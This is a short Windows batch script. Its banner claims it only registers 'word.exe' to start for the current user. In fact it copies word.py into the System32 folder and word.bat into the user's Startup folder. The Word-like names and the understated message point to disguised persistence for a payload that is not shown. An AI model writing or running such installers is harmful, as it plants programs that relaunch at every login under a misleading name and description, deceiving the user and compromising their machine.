@echo off
echo ------------------------------
echo IMPORTANT: This script will ONLY register word.exe as startup for current user.
whoami
echo ------------------------------
timeout -t 2 -nobreak >nul
copy word.py "C:\Windows\System32"
copy word.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
echo ------------------------------
echo Exiting in 3 seconds...
timeout -t 3 -nobreak >nul